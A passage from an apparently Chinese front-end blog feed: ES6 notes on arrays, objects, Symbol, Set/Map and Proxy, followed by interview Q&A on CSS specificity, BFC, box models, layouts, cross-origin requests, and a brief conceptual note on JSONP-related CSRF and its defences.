<p>Array.from方法会将数组的空位，转为undefined，也就是说，这个方法不会忽略空位。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.from([<span class="string">'a'</span>,,<span class="string">'b'</span>])</span><br><span class="line"><span class="comment">// [ "a", undefined, "b" ]</span></span><br></pre></td></tr></table></figure></p>
<p>扩展运算符（…）也会将空位转为undefined。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[...[<span class="string">'a'</span>,,<span class="string">'b'</span>]]</span><br><span class="line"><span class="comment">// [ "a", undefined, "b" ]</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
<p>copyWithin()会连空位一起拷贝。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[,<span class="string">'a'</span>,<span class="string">'b'</span>,,].copyWithin(<span class="number">2</span>,<span class="number">0</span>) <span class="comment">// [,"a",,"a"]</span></span><br></pre></td></tr></table></figure></p>
<p>fill()会将空位视为正常的数组位置。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>).fill(<span class="string">'a'</span>) <span class="comment">// ["a","a","a"]</span></span><br></pre></td></tr></table></figure></p>
<p>for…of循环也会遍历空位。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [, ,];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> arr) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p>
<p>上面代码中，数组arr有两个空位，for…of并没有忽略它们。如果改成map方法遍历，空位是会跳过的。</p>
<p>entries()、keys()、values()、find()和findIndex()会将空位处理成undefined。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// entries()</span></span><br><span class="line">[...[,<span class="string">'a'</span>].entries()] <span class="comment">// [[0,undefined], [1,"a"]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// keys()</span></span><br><span class="line">[...[,<span class="string">'a'</span>].keys()] <span class="comment">// [0,1]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// values()</span></span><br><span class="line">[...[,<span class="string">'a'</span>].values()] <span class="comment">// [undefined,"a"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// find()</span></span><br><span class="line">[,<span class="string">'a'</span>].find(<span class="function"><span class="params">x</span> =&gt;</span> <span class="literal">true</span>) <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// findIndex()</span></span><br><span class="line">[,<span class="string">'a'</span>].findIndex(<span class="function"><span class="params">x</span> =&gt;</span> <span class="literal">true</span>) <span class="comment">// 0</span></span><br></pre></td></tr></table></figure></p>
<p>由于空位的处理规则非常不统一，所以建议避免出现空位。</p>
<h2 id="Array-prototype-sort-的排序稳定性"><a href="#Array-prototype-sort-的排序稳定性" class="headerlink" title="Array.prototype.sort() 的排序稳定性"></a>Array.prototype.sort() 的排序稳定性</h2><p>排序稳定性（stable sorting）是排序算法的重要属性，指的是排序关键字相同的项目，排序前后的顺序不变。</p>
<p>常见的排序算法之中，插入排序、合并排序、冒泡排序等都是稳定的，堆排序、快速排序等是不稳定的。不稳定排序的主要缺点是，多重排序时可能会产生问题。假设有一个姓和名的列表，要求按照“姓氏为主要关键字，名字为次要关键字”进行排序。开发者可能会先按名字排序，再按姓氏进行排序。如果排序算法是稳定的，这样就可以达到“先姓氏，后名字”的排序效果。如果是不稳定的，就不行。</p>
<p>早先的 ECMAScript 没有规定，Array.prototype.sort()的默认排序算法是否稳定，留给浏览器自己决定，这导致某些实现是不稳定的。ES2019 明确规定，Array.prototype.sort()的默认排序算法必须稳定。这个规定已经做到了，现在 JavaScript 各个主要实现的默认排序算法都是稳定的。</p>
<h1 id="对象的扩展"><a href="#对象的扩展" class="headerlink" title="对象的扩展"></a>对象的扩展</h1><h2 id="方法的-name-属性"><a href="#方法的-name-属性" class="headerlink" title="方法的 name 属性"></a>方法的 name 属性</h2><p>函数的name属性，返回函数名。对象方法也是函数，因此也有name属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">  sayName() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello!'</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">person.sayName.name   <span class="comment">// "sayName"</span></span><br></pre></td></tr></table></figure>
<p>如果对象的方法使用了取值函数（getter）和存值函数（setter），则name属性不是在该方法上面，而是该方法的属性的描述对象的get和set属性上面，返回值是方法名前加上get和set。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="keyword">get</span> foo() &#123;&#125;,</span><br><span class="line">  <span class="keyword">set</span> foo(x) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.foo.name</span><br><span class="line"><span class="comment">// TypeError: Cannot read property 'name' of undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> descriptor = <span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, <span class="string">'foo'</span>);</span><br><span class="line"></span><br><span class="line">descriptor.get.name <span class="comment">// "get foo"</span></span><br><span class="line">descriptor.set.name <span class="comment">// "set foo"</span></span><br></pre></td></tr></table></figure>
<p>有两种特殊情况：bind方法创造的函数，name属性返回bound加上原函数的名字；Function构造函数创造的函数，name属性返回anonymous。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="built_in">Function</span>()).name <span class="comment">// "anonymous"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> doSomething = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line">doSomething.bind().name <span class="comment">// "bound doSomething"</span></span><br></pre></td></tr></table></figure>
<p>如果对象的方法是一个 Symbol 值，那么name属性返回的是这个 Symbol 值的描述。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> key1 = <span class="built_in">Symbol</span>(<span class="string">'description'</span>);</span><br><span class="line"><span class="keyword">const</span> key2 = <span class="built_in">Symbol</span>();</span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  [key1]() &#123;&#125;,</span><br><span class="line">  [key2]() &#123;&#125;,</span><br><span class="line">&#125;;</span><br><span class="line">obj[key1].name <span class="comment">// "[description]"</span></span><br><span class="line">obj[key2].name <span class="comment">// ""</span></span><br></pre></td></tr></table></figure>
<h2 id="属性的可枚举性和遍历"><a href="#属性的可枚举性和遍历" class="headerlink" title="属性的可枚举性和遍历"></a>属性的可枚举性和遍历</h2><h2 id="可枚举性"><a href="#可枚举性" class="headerlink" title="可枚举性"></a>可枚举性</h2><p>对象的每个属性都有一个描述对象（Descriptor），用来控制该属性的行为。Object.getOwnPropertyDescriptor方法可以获取该属性的描述对象。</p>
<p>描述对象的enumerable属性，称为“可枚举性”，如果该属性为false，就表示某些操作会忽略当前属性。</p>
<p>目前，有四个操作会忽略enumerable为false的属性。</p>
<ol>
<li>for…in循环：只遍历对象自身的和继承的可枚举的属性。</li>
<li>Object.keys()：返回对象自身的所有可枚举的属性的键名。</li>
<li>JSON.stringify()：只串行化对象自身的可枚举的属性。</li>
<li>Object.assign()： 忽略enumerable为false的属性，只拷贝对象自身的可枚举的属性。</li>
</ol>
<h2 id="属性的遍历"><a href="#属性的遍历" class="headerlink" title="属性的遍历"></a>属性的遍历</h2><p>ES6 一共有 5 种方法可以遍历对象的属性。</p>
<h2 id="for…in"><a href="#for…in" class="headerlink" title="for…in"></a>for…in</h2><p>for…in循环遍历对象自身的和继承的可枚举属性（不含 Symbol 属性）。</p>
<h2 id="Object-keys-obj"><a href="#Object-keys-obj" class="headerlink" title="Object.keys(obj)"></a>Object.keys(obj)</h2><p>Object.keys返回一个数组，包括对象自身的（不含继承的）所有可枚举属性（不含 Symbol 属性）的键名。</p>
<h2 id="Object-getOwnPropertyNames-obj"><a href="#Object-getOwnPropertyNames-obj" class="headerlink" title="Object.getOwnPropertyNames(obj)"></a>Object.getOwnPropertyNames(obj)</h2><p>Object.getOwnPropertyNames返回一个数组，包含对象自身的所有属性（不含 Symbol 属性，但是包括不可枚举属性）的键名。</p>
<h2 id="Object-getOwnPropertySymbols-obj"><a href="#Object-getOwnPropertySymbols-obj" class="headerlink" title="Object.getOwnPropertySymbols(obj)"></a>Object.getOwnPropertySymbols(obj)</h2><p>Object.getOwnPropertySymbols返回一个数组，包含对象自身的所有 Symbol 属性的键名。</p>
<h2 id="Reflect-ownKeys-obj"><a href="#Reflect-ownKeys-obj" class="headerlink" title="Reflect.ownKeys(obj)"></a>Reflect.ownKeys(obj)</h2><p>Reflect.ownKeys返回一个数组，包含对象自身的（不含继承的）所有键名，不管键名是 Symbol 或字符串，也不管是否可枚举。</p>
<p>以上的 5 种方法遍历对象的键名，都遵守同样的属性遍历的次序规则。</p>
<ol>
<li>首先遍历所有数值键，按照数值升序排列。</li>
<li>其次遍历所有字符串键，按照加入时间升序排列。</li>
<li>最后遍历所有 Symbol 键，按照加入时间升序排列。</li>
</ol>
<h2 id="super-关键字"><a href="#super-关键字" class="headerlink" title="super 关键字"></a>super 关键字</h2><p>我们知道，this关键字总是指向函数所在的当前对象，ES6 又新增了另一个类似的关键字super，指向当前对象的原型对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> proto = &#123;</span><br><span class="line">  foo: <span class="string">'hello'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  foo: <span class="string">'world'</span>,</span><br><span class="line">  find() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.foo;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(obj, proto);</span><br><span class="line">obj.find() <span class="comment">// "hello"</span></span><br></pre></td></tr></table></figure>
<p>JavaScript 引擎内部，super.foo等同于Object.getPrototypeOf(this).foo（属性）或Object.getPrototypeOf(this).foo.call(this)（方法）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> proto = &#123;</span><br><span class="line">  x: <span class="string">'hello'</span>,</span><br><span class="line">  foo() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.x);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  x: <span class="string">'world'</span>,</span><br><span class="line">  foo() &#123;</span><br><span class="line">    <span class="keyword">super</span>.foo();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(obj, proto);</span><br><span class="line"></span><br><span class="line">obj.foo() <span class="comment">// "world"</span></span><br></pre></td></tr></table></figure>
<h2 id="Object-entries"><a href="#Object-entries" class="headerlink" title="Object.entries()"></a>Object.entries()</h2><p>Object.entries方法的一个用处是，将对象转为真正的Map结构。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">foo</span>: <span class="string">'bar'</span>, <span class="attr">baz</span>: <span class="number">42</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>(<span class="built_in">Object</span>.entries(obj));</span><br><span class="line">map <span class="comment">// Map &#123; foo: "bar", baz: 42 &#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Object-fromEntries"><a href="#Object-fromEntries" class="headerlink" title="Object.fromEntries()"></a>Object.fromEntries()</h2><p>Object.fromEntries()方法是Object.entries()的逆操作，用于将一个键值对数组转为对象。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.fromEntries([</span><br><span class="line">  [<span class="string">'foo'</span>, <span class="string">'bar'</span>],</span><br><span class="line">  [<span class="string">'baz'</span>, <span class="number">42</span>]</span><br><span class="line">])</span><br><span class="line"><span class="comment">// &#123; foo: "bar", baz: 42 &#125;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h1><h2 id="Symbol-for-、Symbol-keyFor"><a href="#Symbol-for-、Symbol-keyFor" class="headerlink" title="Symbol.for()、Symbol.keyFor()"></a>Symbol.for()、Symbol.keyFor()</h2><p>有时，我们希望重新使用同一个 Symbol 值，Symbol.for()方法可以做到这一点。它接受一个字符串作为参数，然后搜索有没有以该参数作为名称的 Symbol 值。如果有，就返回这个 Symbol 值，否则就新建一个以该字符串为名称的 Symbol 值，并将其注册到全局。</p>
<p>由于Symbol()写法没有登记机制，所以每次调用都会返回一个不同的值。</p>
<p>Symbol.keyFor()方法返回一个已登记的 Symbol 类型值的key。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s1 = <span class="built_in">Symbol</span>.for(<span class="string">"foo"</span>);</span><br><span class="line"><span class="built_in">Symbol</span>.keyFor(s1) <span class="comment">// "foo"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> s2 = <span class="built_in">Symbol</span>(<span class="string">"foo"</span>);</span><br><span class="line"><span class="built_in">Symbol</span>.keyFor(s2) <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></p>
<p>Symbol.for()的这个全局登记特性，可以用在不同的 iframe 或 service worker 中取到同一个值。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">iframe.src = <span class="built_in">String</span>(<span class="built_in">window</span>.location);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line"></span><br><span class="line">iframe.contentWindow.Symbol.for(<span class="string">'foo'</span>) === <span class="built_in">Symbol</span>.for(<span class="string">'foo'</span>)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
<h1 id="Set-和-Map-数据结构"><a href="#Set-和-Map-数据结构" class="headerlink" title="Set 和 Map 数据结构"></a>Set 和 Map 数据结构</h1><h1 id="WeakSet"><a href="#WeakSet" class="headerlink" title="WeakSet"></a>WeakSet</h1><p>WeakSe结构与 Set 类似，也是不重复的值的集合。但是，它与 Set 有两个区别。</p>
<p>首先，WeakSet 的成员只能是对象，而不能是其他类型的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="built_in">WeakSet</span>();</span><br><span class="line">ws.add(<span class="number">1</span>)</span><br><span class="line"><span class="comment">// TypeError: Invalid value used in weak set</span></span><br><span class="line">ws.add(<span class="built_in">Symbol</span>())</span><br><span class="line"><span class="comment">// TypeError: invalid value used in weak set</span></span><br></pre></td></tr></table></figure>
<p>其次，WeakSet 中的对象都是弱引用，即垃圾回收机制不考虑 WeakSet 对该对象的引用，也就是说，如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象还存在于 WeakSet 之中。</p>
<p>因此，WeakSet 适合临时存放一组对象，以及存放跟对象绑定的信息。只要这些对象在外部消失，它在 WeakSet 里面的引用就会自动消失。</p>
<p>由于上面这个特点，WeakSet 的成员是不适合引用的，因为它会随时消失。另外，由于 WeakSet 内部有多少个成员，取决于垃圾回收机制有没有运行，运行前后很可能成员个数是不一样的，而垃圾回收机制何时运行是不可预测的，因此 ES6 规定 WeakSet 不可遍历。</p>
<h1 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h1><p>Map 的键实际上是跟内存地址绑定的，只要内存地址不一样，就视为两个键。这就解决了同名属性碰撞（clash）的问题，我们扩展别人的库的时候，如果使用对象作为键名，就不用担心自己的属性与原作者的属性同名。</p>
<p>如果 Map 的键是一个简单类型的值（数字、字符串、布尔值），则只要两个值严格相等，Map 将其视为一个键，比如0和-0就是一个键，布尔值true和字符串true则是两个不同的键。另外，undefined和null也是两个不同的键。虽然NaN不严格相等于自身，但 Map 将其视为同一个键。</p>
<p>Map 的遍历顺序就是插入顺序。</p>
<h1 id="WeakMap"><a href="#WeakMap" class="headerlink" title="WeakMap"></a>WeakMap</h1><p>WeakMap只接受对象作为键名，不接受其他类型的值作为键名。WeakMap的键名所指向的对象，不计入垃圾回收机制。</p>
<h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><p>对于可以设置、但没有设置拦截的操作，则直接落在目标对象上，按照原先的方式产生结果。</p>
<p>下面是 Proxy 支持的拦截操作一览，一共 13 种。</p>
<ol>
<li><p>get(target, propKey, receiver)：拦截对象属性的读取，比如proxy.foo和<code>proxy[&#39;foo&#39;]</code>。</p>
</li>
<li><p>set(target, propKey, value, receiver)：拦截对象属性的设置，比如proxy.foo = v或<code>proxy[&#39;foo&#39;] = v</code>，返回一个布尔值。</p>
</li>
<li><p>has(target, propKey)：拦截propKey in proxy的操作，返回一个布尔值。</p>
</li>
<li><p>deleteProperty(target, propKey)：拦截delete proxy[propKey]的操作，返回一个布尔值。</p>
</li>
<li><p>ownKeys(target)：拦截Object.getOwnPropertyNames(proxy)、Object.getOwnPropertySymbols(proxy)、Object.keys(proxy)、for…in循环，返回一个数组。该方法返回目标对象所有自身的属性的属性名，而Object.keys()的返回结果仅包括目标对象自身的可遍历属性。</p>
</li>
<li><p>getOwnPropertyDescriptor(target, propKey)：拦截Object.getOwnPropertyDescriptor(proxy, propKey)，返回属性的描述对象。</p>
</li>
<li><p>defineProperty(target, propKey, propDesc)：拦截Object.defineProperty(proxy, propKey, propDesc）、Object.defineProperties(proxy, propDescs)，返回一个布尔值。</p>
</li>
<li><p>preventExtensions(target)：拦截Object.preventExtensions(proxy)，返回一个布尔值。</p>
</li>
<li><p>getPrototypeOf(target)：拦截Object.getPrototypeOf(proxy)，返回一个对象。</p>
</li>
<li><p>isExtensible(target)：拦截Object.isExtensible(proxy)，返回一个布尔值。</p>
</li>
<li><p>setPrototypeOf(target, proto)：拦截Object.setPrototypeOf(proxy, proto)，返回一个布尔值。如果目标对象是函数，那么还有两种额外操作可以拦截。</p>
</li>
<li><p>apply(target, object, args)：拦截 Proxy 实例作为函数调用的操作，比如proxy(…args)、proxy.call(object, …args)、proxy.apply(…)。</p>
</li>
<li><p>construct(target, args)：拦截 Proxy 实例作为构造函数调用的操作，比如new proxy(…args)。</p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>面试题</title>
    <url>/2020/10/17/%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
    <content><![CDATA[<p>面试题<br><a id="more"></a></p>
<h1 id="说说CSS选择器以及这些选择器的优先级"><a href="#说说CSS选择器以及这些选择器的优先级" class="headerlink" title="说说CSS选择器以及这些选择器的优先级"></a>说说CSS选择器以及这些选择器的优先级</h1><ol>
<li>!important</li>
<li>内联样式（1000）</li>
<li>ID选择器（0100）</li>
<li>类选择器/属性选择器/伪类选择器（0010）</li>
<li>元素选择器/伪元素选择器（0001）</li>
<li>关系选择器(&gt;等)/通配符选择器（0000）</li>
</ol>
<h1 id="什么是BFC"><a href="#什么是BFC" class="headerlink" title="???什么是BFC"></a>???什么是BFC</h1><p>BFC 全称为块级格式化上下文 (Block Formatting Context) 。BFC是 W3C CSS 2.1 规范中的一个概念，它决定了元素如何对其内容进行定位以及与其他元素的关系和相互作用，当涉及到可视化布局的时候，Block Formatting Context提供了一个环境，HTML元素在这个环境中按照一定规则进行布局。一个环境中的元素不会影响到其它环境中的布局。比如浮动元素会形成BFC，浮动元素内部子元素的主要受该浮动元素影响，两个浮动元素之间是互不影响的。这里有点类似一个BFC就是一个独立的行政单位的意思。可以说BFC就是一个作用范围，把它理解成是一个独立的容器，并且这个容器里box的布局与这个容器外的box毫不相干。</p>
<h1 id="触发BFC的条件"><a href="#触发BFC的条件" class="headerlink" title="触发BFC的条件"></a>触发BFC的条件</h1><ol>
<li>根元素或其它包含它的元素</li>
<li>浮动元素 (元素的 float 不是 none)</li>
<li>绝对定位元素 (元素具有 position 为 absolute 或 fixed)</li>
<li>内联块 (元素具有 display: inline-block)</li>
<li>表格单元格 (元素具有 display: table-cell，HTML表格单元格默认属性)</li>
<li>表格标题 (元素具有 display: table-caption, HTML表格标题默认属性)</li>
<li>具有overflow 且值不是 visible 的块元素</li>
<li>弹性盒（flex或inline-flex）</li>
<li>display: flow-root</li>
<li>column-span: all</li>
</ol>
<h1 id="BFC的约束规则"><a href="#BFC的约束规则" class="headerlink" title="BFC的约束规则"></a>BFC的约束规则</h1><ol>
<li>内部的盒会在垂直方向一个接一个排列（可以看作BFC中有一个的常规流）</li>
<li>处于同一个BFC中的元素相互影响，可能会发生外边距重叠</li>
<li>每个元素的margin box的左边，与容器块border box的左边相接触(对于从左往右的格式化，否则相反)，即使存在浮动也是如此</li>
<li>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素，反之亦然</li>
<li>计算BFC的高度时，考虑BFC所包含的所有元素，连浮动元素也参与计算</li>
<li>浮动盒区域不叠加到BFC上</li>
</ol>
<h1 id="BFC可以解决的问题"><a href="#BFC可以解决的问题" class="headerlink" title="BFC可以解决的问题"></a>BFC可以解决的问题</h1><ol>
<li>垂直外边距重叠问题</li>
<li>去除浮动</li>
<li>自适用两列布局（float + overflow）</li>
</ol>
<h1 id="了解盒模型么"><a href="#了解盒模型么" class="headerlink" title="了解盒模型么"></a>了解盒模型么</h1><p>包括内容区域、内边距区域、边框区域和外边距区域。</p>
<p>w3c的盒模型和IE浏览器下的盒模型不同的是：IE下width=border+padding+content</p>
<p>box-sizing: content-box（W3C盒子模型）：元素的宽高大小表现为内容的大小。 box-sizing: border-box（IE盒子模型）：元素的宽高表现为内容 + 内边距 + 边框的大小。背景会延伸到边框的外沿。</p>
<p>IE5.x和IE6在怪异模式中使用非标准的盒子模型，这些浏览器的width属性不是内容的宽度，而是内容、内边距和边框的宽度的总和。</p>
<h1 id="如何实现左侧宽度固定，右侧宽度自适应的布局"><a href="#如何实现左侧宽度固定，右侧宽度自适应的布局" class="headerlink" title="如何实现左侧宽度固定，右侧宽度自适应的布局???"></a>如何实现左侧宽度固定，右侧宽度自适应的布局???</h1><p>DOM结构</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box-left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box-right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="利用float-margin实现"><a href="#利用float-margin实现" class="headerlink" title="利用float + margin实现"></a>利用float + margin实现</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line"> <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span> &gt; <span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box-left</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">background-color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box-right</span> &#123;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="利用calc计算宽度"><a href="#利用calc计算宽度" class="headerlink" title="利用calc计算宽度"></a>利用calc计算宽度</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line"> <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span> &gt; <span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box-left</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">background-color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box-right</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">200px</span>);</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">  <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="利用float-overflow实现"><a href="#利用float-overflow实现" class="headerlink" title="利用float + overflow实现"></a>利用float + overflow实现</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line"> <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span> &gt; <span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box-left</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">background-color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box-right</span> &#123;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="利用flex实现"><a href="#利用flex实现" class="headerlink" title="利用flex实现"></a>利用flex实现</h2><p>这里不是最佳答案，应该是使用flex-basis实现更合理<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span> &gt; <span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box-left</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box-right</span> &#123;</span><br><span class="line">  flex: 1; // 设置flex-grow属性为1，默认为0</span><br><span class="line">  <span class="selector-tag">overflow</span>: <span class="selector-tag">hidden</span>;</span><br><span class="line">  <span class="selector-tag">background-color</span>: <span class="selector-tag">red</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="了解跨域吗，一般什么情况下会导致跨域"><a href="#了解跨域吗，一般什么情况下会导致跨域" class="headerlink" title="了解跨域吗，一般什么情况下会导致跨域"></a>了解跨域吗，一般什么情况下会导致跨域</h1><h2 id="跨域行为"><a href="#跨域行为" class="headerlink" title="跨域行为"></a>跨域行为</h2><ol>
<li>同源策略限制、安全性考虑</li>
<li>协议、IP和端口不一致都是跨域行为</li>
</ol>
<h1 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h1><p>Web前端事先定义一个用于获取跨域响应数据的回调函数，并通过没有同源策略限制的script标签发起一个请求（将回调函数的名称放到这个请求的query参数里），然后服务端返回这个回调函数的执行，并将需要响应的数据放到回调函数的参数里，前端的script标签请求到这个执行的回调函数后会立马执行，于是就拿到了执行的响应数据。</p>
<p>缺点： JSONP只能发起GET请求</p>
<h1 id="JSONP安全性问题"><a href="#JSONP安全性问题" class="headerlink" title="JSONP安全性问题"></a>JSONP安全性问题</h1><h2 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h2><p>前端构造一个恶意页面，请求JSONP接口，收集服务端的敏感信息。如果JSONP接口还涉及一些敏感操作或信息（比如登录、删除等操作），那就更不安全了。</p>
<p>解决方法：验证JSONP的调用来源（Referer），服务端判断Referer是否是白名单，或者部署随机Token来防御。</p>
